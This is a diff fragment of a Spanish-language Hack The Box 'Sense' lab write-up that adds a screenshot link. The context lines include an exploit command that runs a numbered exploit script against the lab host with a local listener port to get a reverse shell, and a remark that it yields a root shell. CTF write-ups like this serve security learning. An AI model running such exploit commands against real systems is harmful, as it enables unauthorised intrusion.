@@ -51,6 +51,10 @@ python3 43560.py --rhost 10.129.76.69 --lhost 10.10.14.10 --lport 4444 --usernam
 
 ```
 
+![image](https://github.com/gecr07/Sense-HTB/assets/63270579/4b0b45f5-5fae-46ca-8f63-705d693ab69d)
+
+
+
 Regresa una shell con privilegios de root no me dejo hacer ni full tty.
 
 ## Plus
